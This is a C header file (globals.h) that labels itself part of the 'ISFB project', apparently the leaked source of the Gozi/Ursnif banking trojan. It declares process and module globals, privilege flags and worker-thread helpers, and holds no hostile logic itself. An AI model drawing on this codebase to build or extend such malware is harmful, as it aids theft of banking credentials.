//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: globals.h
// $Revision: 405 $
// $Date: 2014-11-20 18:43:41 +0300 (Чт, 20 ноя 2014) $
// description:
//	 Global constants and variables



#define G_SYSTEM_VERSION		1		// OS version
#define	G_CURRENT_PROCESS_ID	2		// Current process ID
#define G_CURRENT_MODULE_PATH	4		// Current module full path for DLL (equal to G_PROCESS_MODULE_PATH for EXE)
#define G_CURRENT_PROCESS_PATH	8		// Current process module full path (for both DLL and EXE)
#define G_APP_SHUTDOWN_EVENT	0x10	// Application shutdown event

// Global process flags
#define	GF_WOW64_PROCESS		1	
#define	GF_ADMIN_PROCESS		2

// Global variables
extern	DWORD			g_CurrentProcessId;
extern	DWORD			g_SystemVersion;
extern	DWORD			g_CurrentProcessFlags;
extern	HMODULE			g_CurrentProcessModule;
extern	HMODULE			g_CurrentModule;
extern	LPTSTR			g_CurrentProcessPath;
extern	LPTSTR			g_CurrentModulePath;
extern	HANDLE			g_AppShutdownEvent;





WINERROR	InitGlobals(HMODULE CurrentModule, ULONG Flags);
VOID		ReleaseGlobals(VOID);


// Worker threads
#pragma pack (push)
#pragma pack(1)
typedef struct _WORKER_THREADS
{
	LONG volatile ActiveCount;
	ULONG	Number;
	HANDLE	Threads[0];
} WORKER_THREADS, *PWORKER_THREADS;
#pragma pack(pop)

_inline VOID WaitForWorkerThreads(PWORKER_THREADS Workers)
{
	while (Workers && Workers->ActiveCount)
	{
		if (WaitForMultipleObjects(Workers->Number, (HANDLE*)&Workers->Threads, TRUE, 100) != WAIT_TIMEOUT)
			break;
	}
}

_inline VOID FreeWorkerThreads(PWORKER_THREADS Workers)
{
	if (Workers)
	{
		ULONG i;
		for (i=0; i<Workers->Number; i++)
			CloseHandle(Workers->Threads[i]);
	}
}